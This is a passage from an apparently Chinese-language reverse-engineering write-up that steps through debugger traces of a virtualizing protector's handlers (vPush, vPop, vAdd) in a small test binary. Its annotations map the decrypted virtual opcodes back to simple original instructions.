xor ecx,ebx</span><br><span class=\"line\">004104A8    81E9 8C1F9123   sub ecx,0x23911F8C</span><br><span class=\"line\">004104B1    D1C9            ror ecx,1</span><br><span class=\"line\">004104B3    49              dec ecx</span><br><span class=\"line\">00440D59    F7D1            not ecx</span><br><span class=\"line\">00440D5C    33D9            xor ebx,ecx</span><br><span class=\"line\">004251B5    03E9            add ebp,ecx</span><br><span class=\"line\">00462636    8D5424 60       lea edx,dword ptr ss:[esp+0x60]</span><br><span class=\"line\">0046263A    3BF2            cmp esi,edx\t\t\t\t\t\t\t\t;堆栈检查</span><br><span class=\"line\">00481402  ^\\0F87 04A9FCFF   ja test1_vm.0044BD0C</span><br><span class=\"line\">00481408    8BC4            mov eax,esp</span><br><span class=\"line\">0048140A    B9 40000000     mov ecx,0x40</span><br><span class=\"line\">0048140F    8D5426 80       lea edx,dword ptr ds:[esi-0x80]</span><br><span class=\"line\">00467341    81E2 FCFFFFFF   and edx,-0x4</span><br><span class=\"line\">00467347    2BD1            sub edx,ecx</span><br><span class=\"line\">00467349    8BE2            mov esp,edx</span><br><span class=\"line\">0046734B    57              push edi                                                    </span><br><span class=\"line\">0045A32C    56              push esi</span><br><span class=\"line\">0045A330    9C              pushfd</span><br><span class=\"line\">00489ACC    8BF0            mov esi,eax                                              </span><br><span class=\"line\">00489AD2    8BFA            mov edi,edx</span><br><span class=\"line\">0045B5BE    F3:A4           rep movs byte ptr es:[edi],byte ptr ds:[esi]</span><br><span class=\"line\">0045B5C2    9D              popfd</span><br><span class=\"line\">0045818E    5E              pop esi                                                                                                  </span><br><span class=\"line\">00458194    5F              pop edi                                                   </span><br><span class=\"line\">0044BD0C    55              push ebp                                                  </span><br><span class=\"line\">0044BD0D    C3              retn\t\t\t\t\t\t;0043E97B</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPush-4-0xFFFFFFFC\"><a href=\"#vPush-4-0xFFFFFFFC\" class=\"headerlink\" title=\"vPush -4(0xFFFFFFFC)\"></a>vPush -4(0xFFFFFFFC)</h3><blockquote>\n<p>变量a地址相对于ebp的相对偏移</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0043E97B    8B0F            mov ecx,dword ptr ds:[edi]\t\t\t\t;从opcode读取4字节</span><br><span class=\"line\">0044140D    81C7 04000000   add edi,0x4\t\t\t\t\t\t\t\t;递增opcode,跳到下一个opcode</span><br><span class=\"line\">00441418    33CB            xor ecx,ebx</span><br><span class=\"line\">0047D18C    41              inc ecx</span><br><span class=\"line\">0047D18D    F7D9            neg ecx</span><br><span class=\"line\">00450AE0    41              inc ecx</span><br><span class=\"line\">00450AE1    81F1 66772375   xor ecx,0x75237766</span><br><span class=\"line\">00450AE7    33D9            xor ebx,ecx\t\t\t\t\t\t\t\t;更新滚动key</span><br><span class=\"line\">00450AEA    8DB6 FCFFFFFF   lea esi,dword ptr ds:[esi-0x4]\t\t\t</span><br><span class=\"line\">00450AF2    890E            mov dword ptr ds:[esi],ecx\t\t\t\t;push ecx</span><br><span class=\"line\">00450AF8    8B0F            mov ecx,dword ptr ds:[edi]</span><br><span class=\"line\">00450AFA    81C7 04000000   add edi,0x4</span><br><span class=\"line\">00450B07    33CB            xor ecx,ebx</span><br><span class=\"line\">00450B0C    F7D9            neg ecx</span><br><span class=\"line\">00450B0E    8D89 6233DE7C   lea ecx,dword ptr ds:[ecx+0x7CDE3362]</span><br><span class=\"line\">00450B17    F7D9            neg ecx</span><br><span class=\"line\">00450B19    F7D1            not ecx</span><br><span class=\"line\">00450B1B    33D9            xor ebx,ecx</span><br><span class=\"line\">00450B1E    03E9            add ebp,ecx</span><br><span class=\"line\">00462636    8D5424 60       lea edx,dword ptr ss:[esp+0x60]</span><br><span class=\"line\">0046263A    3BF2            cmp esi,edx</span><br><span class=\"line\">00481402  ^\\0F87 04A9FCFF   ja test1_vm.0044BD0C</span><br><span class=\"line\">00481408    8BC4            mov eax,esp</span><br><span class=\"line\">0048140A    B9 40000000     mov ecx,0x40</span><br><span class=\"line\">0048140F    8D5426 80       lea edx,dword ptr ds:[esi-0x80]</span><br><span class=\"line\">00467341    81E2 FCFFFFFF   and edx,-0x4</span><br><span class=\"line\">00467347    2BD1            sub edx,ecx</span><br><span class=\"line\">00467349    8BE2            mov esp,edx</span><br><span class=\"line\">0046734B    57              push edi                                                    </span><br><span class=\"line\">0045A32C    56              push esi</span><br><span class=\"line\">0045A32D    0FB7F2          movzx esi,dx</span><br><span class=\"line\">0045A330    9C              pushfd</span><br><span class=\"line\">00489ACC    8BF0            mov esi,eax                                            </span><br><span class=\"line\">00489AD2    8BFA            mov edi,edx</span><br><span class=\"line\">0045B5BE    F3:A4           rep movs byte ptr es:[edi],byte ptr ds:[esi]</span><br><span class=\"line\">0045B5C0    0BFB            or edi,ebx</span><br><span class=\"line\">0045B5C2    9D              popfd</span><br><span class=\"line\">0045818E    5E              pop esi                                                                                            </span><br><span class=\"line\">00458194    5F              pop edi                                                      </span><br><span class=\"line\">0044BD0C    55              push ebp                                                      </span><br><span class=\"line\">0044BD0D    C3              retn\t\t\t\t\t\t\t\t;0040423D</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mov eax,dword ptr ds:[v_esp]\t;变量a地址相对于ebp的相对偏移</span><br><span class=\"line\">mov edx,dword ptr ds:[v_esp+0x4]</span><br><span class=\"line\">add eax,edx</span><br><span class=\"line\">mov dword ptr ds:[v_esp+0x4],eax</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"计算变量a的地址-ebp-4\"><a href=\"#计算变量a的地址-ebp-4\" class=\"headerlink\" title=\"计算变量a的地址,ebp-4\"></a>计算变量a的地址,ebp-4</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0040423D    8B06            mov eax,dword ptr ds:[esi]\t\t\t;从原始esp读取变量a地址相对于edx的偏移</span><br><span class=\"line\">00404243    8B56 04         mov edx,dword ptr ds:[esi+0x4]\t\t;从原始esp+4 读取ebp</span><br><span class=\"line\">00404248    03C2            add eax,edx\t\t\t\t\t\t\t;相加后eax为变量a地址</span><br><span class=\"line\">0044AFE5    8946 04         mov dword ptr ds:[esi+0x4],eax\t\t;eax压入原始esp+4 位置</span><br><span class=\"line\">0044AFED    9C              pushfd</span><br><span class=\"line\">0044AFEE    8F06            pop dword ptr ds:[esi]                                       </span><br><span class=\"line\">0044AFF7    8B0F            mov ecx,dword ptr ds:[edi]</span><br><span class=\"line\">0044AFF9    81C7 04000000   add edi,0x4</span><br><span class=\"line\">0044B000    33CB            xor ecx,ebx</span><br><span class=\"line\">004056EF    C1C9 03         ror ecx,0x3</span><br><span class=\"line\">004056F6    F7D1            not ecx</span><br><span class=\"line\">004056F8    81C1 C448053F   add ecx,0x3F0548C4</span><br><span class=\"line\">00405701    81F1 2A55B526   xor ecx,0x26B5552A</span><br><span class=\"line\">00405707    81E9 864A0664   sub ecx,0x64064A86</span><br><span class=\"line\">00405710    33D9            xor ebx,ecx</span><br><span class=\"line\">00405718    03E9            add ebp,ecx</span><br><span class=\"line\">0040571A    55              push ebp                                                    </span><br><span class=\"line\">0040571B    C3              retn\t\t\t\t\t\t\t\t;0046FF2C</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPop-r12-1\"><a href=\"#vPop-r12-1\" class=\"headerlink\" title=\"vPop r12\"></a>vPop r12</h3><blockquote>\n<p>将偏移弹到R12</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0046FF2C    8B0E            mov ecx,dword ptr ds:[esi]\t\t\t;从原始esp读取变量a地址相对于edx的偏移</span><br><span class=\"line\">0046FF2E    8DB6 04000000   lea esi,dword ptr ds:[esi+0x4]\t\t;原地esp+4,pop ecx</span><br><span class=\"line\">0046FF37    0FB607          movzx eax,byte ptr ds:[edi]\t\t\t;读取opcode的第一个字节</span><br><span class=\"line\">0046FF3A    8DBF 01000000   lea edi,dword ptr ds:[edi+0x1]\t\t;跳过读取的字节</span><br><span class=\"line\">0046FF48    32C3            xor al,bl\t\t\t\t\t\t\t;解密读取到的字节</span><br><span class=\"line\">0046FF53    04 95           add al,0x95</span><br><span class=\"line\">00446B15    F6D8            neg al</span><br><span class=\"line\">00454B5C    FEC0            inc al</span><br><span class=\"line\">00454B61    34 28           xor al,0x28</span><br><span class=\"line\">00454B64    32D8            xor bl,al</span><br><span class=\"line\">00454B66    890C04          mov dword ptr ss:[esp+eax],ecx\t\t;出栈</span><br><span class=\"line\">00454B6C    8B0F            mov ecx,dword ptr ds:[edi]</span><br><span class=\"line\">00454B72    8DBF 04000000   lea edi,dword ptr ds:[edi+0x4]</span><br><span class=\"line\">00454B7A    33CB            xor ecx,ebx</span><br><span class=\"line\">00454B7C    C1C9 02         ror ecx,0x2</span><br><span class=\"line\">00454B7F    81F1 7E7F9C09   xor ecx,0x99C7F7E</span><br><span class=\"line\">00422059    49              dec ecx</span><br><span class=\"line\">0042205D    81F1 F25E4677   xor ecx,0x77465EF2</span><br><span class=\"line\">00422065    8D89 1A29644A   lea ecx,dword ptr ds:[ecx+0x4A64291A]</span><br><span class=\"line\">0042206B    33D9            xor ebx,ecx</span><br><span class=\"line\">0042206D    03E9            add ebp,ecx</span><br><span class=\"line\">00409147   /FFE5            jmp ebp                             ;0041D673  </span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mov \teax,dword ptr ds:[v_esp]\t;变量a地址</span><br><span class=\"line\">mov\tedx,dword ptr ds:[v_esp+0x4]\t;之前vPush进来的1</span><br><span class=\"line\">mov\tdword ptr ds:[eax],edx\t;mov         dword ptr [ebp-4],1</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"mov-dword-ptr-ebp-4-1\"><a href=\"#mov-dword-ptr-ebp-4-1\" class=\"headerlink\" title=\"mov dword ptr [ebp-4],1\"></a>mov dword ptr [ebp-4],1</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0041D673    8B06            mov eax,dword ptr ds:[esi]\t\t\t;变量a的地址</span><br><span class=\"line\">0041D67D    8B56 04         mov edx,dword ptr ds:[esi+0x4]\t\t;之前vPush进来的1</span><br><span class=\"line\">0041D688    8DB6 08000000   lea esi,dword ptr ds:[esi+0x8]\t\t;出栈</span><br><span class=\"line\">0046C3DB    36:8910         mov dword ptr ss:[eax],edx\t\t\t;给变量a赋值,a=1</span><br><span class=\"line\">0046C3DE    8B07            mov eax,dword ptr ds:[edi]</span><br><span class=\"line\">0046C3E0    81C7 04000000   add edi,0x4</span><br><span class=\"line\">0046C3E6    33C3            xor eax,ebx                                                                                             </span><br><span class=\"line\">0041CA25    F7D0            not eax</span><br><span class=\"line\">0041CA28    8D80 39CAABFE   lea eax,dword ptr ds:[eax-0x15435C7]</span><br><span class=\"line\">0041CA31    35 CE111A71     xor eax,0x711A11CE</span><br><span class=\"line\">0041CA3B    8D80 03AE9DB8   lea eax,dword ptr ds:[eax-0x476251FD]</span><br><span class=\"line\">0041CA42    33D8            xor ebx,eax</span><br><span class=\"line\">0041CA45    03E8            add ebp,eax</span><br><span class=\"line\">00483D3B  ^\\FFE5            jmp ebp            \t\t\t\t\t;0045BC24 </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPush-4-0xFFFFFFFC-1\"><a href=\"#vPush-4-0xFFFFFFFC-1\" class=\"headerlink\" title=\"vPush -4(0xFFFFFFFC)\"></a>vPush -4(0xFFFFFFFC)</h3><blockquote>\n<p>变量a地址相对于ebp的相对偏移</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0045BC24    8B0F            mov ecx,dword ptr ds:[edi]\t\t\t\t\t\t;从opcode读取4字节</span><br><span class=\"line\">0045BC2C    81C7 04000000   add edi,0x4\t\t\t\t\t\t\t\t\t\t;递增opcode,跳到下一个opcode</span><br><span class=\"line\">0045BC33    33CB            xor ecx,ebx                                                   </span><br><span class=\"line\">0046BEC4    41              inc ecx</span><br><span class=\"line\">00431C1F    F7D9            neg ecx</span><br><span class=\"line\">00474669    41              inc ecx</span><br><span class=\"line\">00474672    81F1 66772375   xor ecx,0x75237766</span><br><span class=\"line\">00474678    33D9            xor ebx,ecx\t\t\t\t\t\t\t\t\t\t;更新滚动key</span><br><span class=\"line\">0047467C    81EE 04000000   sub esi,0x4</span><br><span class=\"line\">00474684    890E            mov dword ptr ds:[esi],ecx\t\t\t\t\t\t;push ecx</span><br><span class=\"line\">0047468B    8B0F            mov ecx,dword ptr ds:[edi]</span><br><span class=\"line\">0047468D    8DBF 04000000   lea edi,dword ptr ds:[edi+0x4]</span><br><span class=\"line\">00474695    33CB            xor ecx,ebx                                                 </span><br><span class=\"line\">00474697    F7D9            neg ecx</span><br><span class=\"line\">00474699    81C1 6233DE7C   add ecx,0x7CDE3362</span><br><span class=\"line\">0047469F    F7D9            neg ecx</span><br><span class=\"line\">0043D8C9    F7D1            not ecx</span><br><span class=\"line\">0043D8CB    33D9            xor ebx,ecx</span><br><span class=\"line\">00488CC8    03E9            add ebp,ecx</span><br><span class=\"line\">00462636    8D5424 60       lea edx,dword ptr ss:[esp+0x60]</span><br><span class=\"line\">0046263A    3BF2            cmp esi,edx\t\t\t\t\t\t\t\t\t\t\t\t;堆栈检查</span><br><span class=\"line\">00481402  ^\\0F87 04A9FCFF   ja test1_vm.0044BD0C</span><br><span class=\"line\">00481408    8BC4            mov eax,esp</span><br><span class=\"line\">0048140A    B9 40000000     mov ecx,0x40</span><br><span class=\"line\">0048140F    8D5426 80       lea edx,dword ptr ds:[esi-0x80]</span><br><span class=\"line\">00467341    81E2 FCFFFFFF   and edx,-0x4</span><br><span class=\"line\">00467347    2BD1            sub edx,ecx</span><br><span class=\"line\">00467349    8BE2            mov esp,edx</span><br><span class=\"line\">0046734B    57              push edi                                               </span><br><span class=\"line\">0045A32C    56              push esi</span><br><span class=\"line\">0045A330    9C              pushfd</span><br><span class=\"line\">00489ACC    8BF0            mov esi,eax                                          </span><br><span class=\"line\">00489AD2    8BFA            mov edi,edx</span><br><span class=\"line\">0045B5BE    F3:A4           rep movs byte ptr es:[edi],byte ptr ds:[esi]                                            </span><br><span class=\"line\">0045B5C2    9D              popfd</span><br><span class=\"line\">0045818E    5E              pop esi                                                                                          </span><br><span class=\"line\">00458194    5F              pop edi                                                    </span><br><span class=\"line\">0044BD0C    55              push ebp                                                </span><br><span class=\"line\">0044BD0D    C3              retn\t\t\t\t\t\t;00435011</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mov\teax,dword ptr ds:[v_esp]\t;变量a地址相对于ebp的相对偏移</span><br><span class=\"line\">mov\tedx,dword ptr ds:[v_esp+0x4]</span><br><span class=\"line\">add\teax,edx</span><br><span class=\"line\">mov\tdword ptr ds:[v_esp+0x4],eax</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"计算变量a的地址-ebp-4-1\"><a href=\"#计算变量a的地址-ebp-4-1\" class=\"headerlink\" title=\"计算变量a的地址,ebp-4\"></a>计算变量a的地址,ebp-4</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">00435011    8B06            mov eax,dword ptr ds:[esi]\t\t\t\t;从原始esp获取变量a地址相对于ebp的相对偏移</span><br><span class=\"line\">0043501B    8B56 04         mov edx,dword ptr ds:[esi+0x4]\t\t\t;从原始esp+4,获取ebp</span><br><span class=\"line\">00435023    03C2            add eax,edx\t\t\t\t\t\t\t\t;相加得到变量a的地址</span><br><span class=\"line\">00435028    8946 04         mov dword ptr ds:[esi+0x4],eax\t\t\t;入栈</span><br><span class=\"line\">00435034    9C              pushfd</span><br><span class=\"line\">0043503B    8F06            pop dword ptr ds:[esi]                 \t;保存ELF到vm_stack栈顶        \t               </span><br><span class=\"line\">00435043    8B0F            mov ecx,dword ptr ds:[edi]</span><br><span class=\"line\">00435047    8DBF 04000000   lea edi,dword ptr ds:[edi+0x4]</span><br><span class=\"line\">00435055    33CB            xor ecx,ebx                                                  </span><br><span class=\"line\">00435057    C1C9 03         ror ecx,0x3</span><br><span class=\"line\">0043505A    F7D1            not ecx</span><br><span class=\"line\">0043505D    81C1 C448053F   add ecx,0x3F0548C4</span><br><span class=\"line\">00435065    81F1 2A55B526   xor ecx,0x26B5552A</span><br><span class=\"line\">00435070    8D89 7AB5F99B   lea ecx,dword ptr ds:[ecx-0x64064A86]</span><br><span class=\"line\">0043507D    33D9            xor ebx,ecx</span><br><span class=\"line\">00435082    03E9            add ebp,ecx</span><br><span class=\"line\">0046DD9A  ^\\FFE5            jmp ebp          \t\t\t\t\t\t;0x00453841</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPop-r11\"><a href=\"#vPop-r11\" class=\"headerlink\" title=\"vPop r11\"></a>vPop r11</h3><blockquote>\n<p>将偏移弹出</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">00453841    8B0E            mov ecx,dword ptr ds:[esi]\t\t\t\t;从原始esp读取数据</span><br><span class=\"line\">00453846    81C6 04000000   add esi,0x4</span><br><span class=\"line\">00453854    0FB607          movzx eax,byte ptr ds:[edi]\t\t\t\t;读取opcode的第一个字节</span><br><span class=\"line\">00453857    81C7 01000000   add edi,0x1\t\t\t\t\t\t\t\t;跳过读取的字节</span><br><span class=\"line\">00453866    32C3            xor al,bl\t\t\t\t\t\t\t\t;解密读取到的字节</span><br><span class=\"line\">0045386E    04 95           add al,0x95</span><br><span class=\"line\">00453870    F6D8            neg al</span><br><span class=\"line\">00458E65    FEC0            inc al</span><br><span class=\"line\">00458E6B    34 28           xor al,0x28</span><br><span class=\"line\">00458E6D    32D8            xor bl,al</span><br><span class=\"line\">00458E6F    890C04          mov dword ptr ss:[esp+eax],ecx\t\t\t</span><br><span class=\"line\">00458E7C    8B0F            mov ecx,dword ptr ds:[edi]</span><br><span class=\"line\">00479B0C    81C7 04000000   add edi,0x4</span><br><span class=\"line\">0041B623    33CB            xor ecx,ebx                                                   ; test1_vm.00439ED8</span><br><span class=\"line\">00470224    C1C9 02         ror ecx,0x2</span><br><span class=\"line\">00470227    81F1 7E7F9C09   xor ecx,0x99C7F7E</span><br><span class=\"line\">004452FB    49              dec ecx</span><br><span class=\"line\">004452FC    81F1 F25E4677   xor ecx,0x77465EF2</span><br><span class=\"line\">00445305    81C1 1A29644A   add ecx,0x4A64291A</span><br><span class=\"line\">0044530B    33D9            xor ebx,ecx</span><br><span class=\"line\">0044530D    03E9            add ebp,ecx</span><br><span class=\"line\">0043AD66    55              push ebp                                                      ; test1_vm.00453841</span><br><span class=\"line\">0043AD67    C3              retn\t\t\t\t\t\t;00463862</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mov\tedx,dword ptr ds:[esi]</span><br><span class=\"line\">mov\teax,dword ptr ss:[edx]</span><br><span class=\"line\">mov\tdword ptr ds:[v_esp],eax\t;将变量a的值覆盖到esp</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"把变量a的值存放栈顶\"><a href=\"#把变量a的值存放栈顶\" class=\"headerlink\" title=\"把变量a的值存放栈顶\"></a>把变量a的值存放栈顶</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">00463862    8B16            mov edx,dword ptr ds:[esi]\t\t\t;从原始esp读取变量a的地址</span><br><span class=\"line\">0046386C    36:8B02         mov eax,dword ptr ss:[edx]\t\t\t;读取变量a的内容</span><br><span class=\"line\">0046C75B    8906            mov dword ptr ds:[esi],eax\t\t\t;把内容覆盖到变量a的地址</span><br><span class=\"line\">0046C762    8B07            mov eax,dword ptr ds:[edi]\t\t\t;从opcode读取4字节</span><br><span class=\"line\">00481FFA    8DBF 04000000   lea edi,dword ptr ds:[edi+0x4]</span><br><span class=\"line\">00482003    33C3            xor eax,ebx                                                  </span><br><span class=\"line\">0048200B    05 84307C17     add eax,0x177C3084</span><br><span class=\"line\">00444EE2    0FC8            bswap eax</span><br><span class=\"line\">00444EE4    40              inc eax                                              </span><br><span class=\"line\">00444EE7    F7D0            not eax</span><br><span class=\"line\">00444EE9    33D8            xor ebx,eax</span><br><span class=\"line\">00444EEB    03E8            add ebp,eax</span><br><span class=\"line\">00442693    55              push ebp                                                    </span><br><span class=\"line\">00442694    C3              retn\t\t\t\t\t\t\t\t;00430521</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">将变量a的值弹到寄存器R15中,联合上面几句等价于</span><br><span class=\"line\">mov         eax,dword ptr [ebp-4]</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPop-r15-1\"><a href=\"#vPop-r15-1\" class=\"headerlink\" title=\"vPop r15\"></a>vPop r15</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">00430521    8B0E            mov ecx,dword ptr ds:[esi]\t\t\t;取出变量a的值</span><br><span class=\"line\">00430523    81C6 04000000   add esi,0x4</span><br><span class=\"line\">00430529    0FB607          movzx eax,byte ptr ds:[edi]\t\t\t</span><br><span class=\"line\">004552EE    81C7 01000000   add edi,0x1</span><br><span class=\"line\">004552F4    32C3            xor al,bl</span><br><span class=\"line\">004552F9    04 95           add al,0x95</span><br><span class=\"line\">004552FB    F6D8            neg al</span><br><span class=\"line\">004552FD    FEC0            inc al</span><br><span class=\"line\">00455303    34 28           xor al,0x28</span><br><span class=\"line\">00455309    32D8            xor bl,al</span><br><span class=\"line\">0045530C    890C04          mov dword ptr ss:[esp+eax],ecx</span><br><span class=\"line\">00455311    8B0F            mov ecx,dword ptr ds:[edi]</span><br><span class=\"line\">00455313    81C7 04000000   add edi,0x4</span><br><span class=\"line\">0045531F    33CB            xor ecx,ebx</span><br><span class=\"line\">00455324    C1C9 02         ror ecx,0x2</span><br><span class=\"line\">0045532B    81F1 7E7F9C09   xor ecx,0x99C7F7E</span><br><span class=\"line\">00455331    49              dec ecx</span><br><span class=\"line\">00455332    81F1 F25E4677   xor ecx,0x77465EF2</span><br><span class=\"line\">00455339    81C1 1A29644A   add ecx,0x4A64291A</span><br><span class=\"line\">00455345    33D9            xor ebx,ecx</span><br><span class=\"line\">00455347    03E9            add ebp,ecx</span><br><span class=\"line\">004781EB  ^\\FFE5            jmp ebp                              ;004693CB</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPush-1-1\"><a href=\"#vPush-1-1\" class=\"headerlink\" title=\"vPush 1\"></a>vPush 1</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">004693CB    8B0F            mov ecx,dword ptr ds:[edi]\t\t\t\t\t;获取1</span><br><span class=\"line\">004693D3    8DBF 04000000   lea edi,dword ptr ds:[edi+0x4]</span><br><span class=\"line\">0046E6FE    33CB            xor ecx,ebx</span><br><span class=\"line\">00443D5F    41              inc ecx</span><br><span class=\"line\">00443D61    F7D9            neg ecx</span><br><span class=\"line\">004141FF    41              inc ecx</span><br><span class=\"line\">00414206    81F1 66772375   xor ecx,0x75237766</span><br><span class=\"line\">0041420C    33D9            xor ebx,ecx</span><br><span class=\"line\">0041420E    81EE 04000000   sub esi,0x4</span><br><span class=\"line\">00414214    890E            mov dword ptr ds:[esi],ecx        \t\t\t;push                                      </span><br><span class=\"line\">00414221    8B0F            mov ecx,dword ptr ds:[edi]</span><br><span class=\"line\">0047C17B    81C7 04000000   add edi,0x4</span><br><span class=\"line\">0047C181    33CB            xor ecx,ebx</span><br><span class=\"line\">0042DAB1    F7D9            neg ecx</span><br><span class=\"line\">0042DABC    81C1 6233DE7C   add ecx,0x7CDE3362</span><br><span class=\"line\">0042DAC4    F7D9            neg ecx</span><br><span class=\"line\">0042DAC8    F7D1            not ecx</span><br><span class=\"line\">0042DACB    33D9            xor ebx,ecx</span><br><span class=\"line\">0042DACD    03E9            add ebp,ecx</span><br><span class=\"line\">00462636    8D5424 60       lea edx,dword ptr ss:[esp+0x60]</span><br><span class=\"line\">0046263A    3BF2            cmp esi,edx</span><br><span class=\"line\">00481402  ^\\0F87 04A9FCFF   ja test1_vm.0044BD0C</span><br><span class=\"line\">00481408    8BC4            mov eax,esp</span><br><span class=\"line\">0048140A    B9 40000000     mov ecx,0x40</span><br><span class=\"line\">0048140F    8D5426 80       lea edx,dword ptr ds:[esi-0x80]</span><br><span class=\"line\">00467341    81E2 FCFFFFFF   and edx,-0x4</span><br><span class=\"line\">00467347    2BD1            sub edx,ecx</span><br><span class=\"line\">00467349    8BE2            mov esp,edx</span><br><span class=\"line\">0046734B    57              push edi                                                     </span><br><span class=\"line\">0045A32C    56              push esi</span><br><span class=\"line\">0045A32D    0FB7F2          movzx esi,dx</span><br><span class=\"line\">0045A330    9C              pushfd</span><br><span class=\"line\">00489ACC    8BF0            mov esi,eax                                             </span><br><span class=\"line\">00489AD2    8BFA            mov edi,edx</span><br><span class=\"line\">0045B5BE    F3:A4           rep movs byte ptr es:[edi],byte ptr ds:[esi]</span><br><span class=\"line\">0045B5C2    9D              popfd</span><br><span class=\"line\">0045818E    5E              pop esi                                                      </span><br><span class=\"line\">00458194    5F              pop edi                                                       </span><br><span class=\"line\">0044BD0C    55              push ebp                                                      </span><br><span class=\"line\">0044BD0D    C3              retn\t\t\t;0x00421D3D</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>取出R15寄存器的值,然后压栈</p>\n</blockquote>\n<h3 id=\"vPush-15\"><a href=\"#vPush-15\" class=\"headerlink\" title=\"vPush 15\"></a>vPush 15</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">00421D3D    0FB60F          movzx ecx,byte ptr ds:[edi]\t\t\t\t;opcode获取一字节</span><br><span class=\"line\">00421D43    8DBF 01000000   lea edi,dword ptr ds:[edi+0x1]</span><br><span class=\"line\">00421D49    32CB            xor cl,bl</span><br><span class=\"line\">00421D55    F6D9            neg cl</span><br><span class=\"line\">00421D5B    80F1 0E         xor cl,0xE</span><br><span class=\"line\">00421D64    80E9 21         sub cl,0x21</span><br><span class=\"line\">00421D6D    F6D9            neg cl</span><br><span class=\"line\">00421D72    80F1 E2         xor cl,0xE2</span><br><span class=\"line\">00421D78    32D9            xor bl,cl</span><br><span class=\"line\">00421D81    8B140C          mov edx,dword ptr ss:[esp+ecx]\t\t\t;获取R15寄存器的值</span><br><span class=\"line\">00421D87    8DB6 FCFFFFFF   lea esi,dword ptr ds:[esi-0x4]\t</span><br><span class=\"line\">00421D95    8916            mov dword ptr ds:[esi],edx\t\t\t\tpush edx</span><br><span class=\"line\">00421D9D    8B0F            mov ecx,dword ptr ds:[edi]</span><br><span class=\"line\">00455281    8DBF 04000000   lea edi,dword ptr ds:[edi+0x4]</span><br><span class=\"line\">00455289    33CB            xor ecx,ebx                                                 </span><br><span class=\"line\">0045528E    81E9 8C1F9123   sub ecx,0x23911F8C</span><br><span class=\"line\">00455294    D1C9            ror ecx,1</span><br><span class=\"line\">0043425D    49              dec ecx</span><br><span class=\"line\">00434263    F7D1            not ecx</span><br><span class=\"line\">00434267    33D9            xor ebx,ecx</span><br><span class=\"line\">00434269    81FC 1B356876   cmp esp,0x7668351B</span><br><span class=\"line\">0043426F    03E9            add ebp,ecx</span><br><span class=\"line\">00462636    8D5424 60       lea edx,dword ptr ss:[esp+0x60]</span><br><span class=\"line\">0046263A    3BF2            cmp esi,edx</span><br><span class=\"line\">00481402  ^\\0F87 04A9FCFF   ja test1_vm.0044BD0C</span><br><span class=\"line\">00481408    8BC4            mov eax,esp</span><br><span class=\"line\">0048140A    B9 40000000     mov ecx,0x40</span><br><span class=\"line\">0048140F    8D5426 80       lea edx,dword ptr ds:[esi-0x80]</span><br><span class=\"line\">00467341    81E2 FCFFFFFF   and edx,-0x4</span><br><span class=\"line\">00467347    2BD1            sub edx,ecx</span><br><span class=\"line\">00467349    8BE2            mov esp,edx</span><br><span class=\"line\">0046734B    57              push edi                                                      ; test1_vm.0043D111</span><br><span class=\"line\">0045A32C    56              push esi</span><br><span class=\"line\">0045A330    9C              pushfd</span><br><span class=\"line\">00489ACC    8BF0            mov esi,eax                                            </span><br><span class=\"line\">00489AD2    8BFA            mov edi,edx</span><br><span class=\"line\">0045B5BE    F3:A4           rep movs byte ptr es:[edi],byte ptr ds:[esi]                                             </span><br><span class=\"line\">0045B5C2    9D              popfd</span><br><span class=\"line\">0045818E    5E              pop esi                                                                                                      </span><br><span class=\"line\">00458194    5F              pop edi                                                     </span><br><span class=\"line\">0044BD0C    55              push ebp                                                      </span><br><span class=\"line\">0044BD0D    C3              retn\t;0x004616C3</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">vAdd\tdword ptr ds:[v_esp+0x4],R15\t;add         eax,1 </span><br><span class=\"line\">mov\tdword ptr ds:[v_esp],EFL</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vAdd-dword-ptr-ds-v-esp-0x4-R15\"><a href=\"#vAdd-dword-ptr-ds-v-esp-0x4-R15\" class=\"headerlink\" title=\"vAdd dword ptr ds:[v_esp+0x4],R15\"></a>vAdd dword ptr ds:[v_esp+0x4],R15</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">004616C3    8B06             mov eax,dword ptr ds:[esi]\t\t\t\t\t;读取R15</span><br><span class=\"line\">004616CC    8B56 04          mov edx,dword ptr ds:[esi+0x4]\t\t\t\t;读取数值1</span><br><span class=\"line\">004616D6  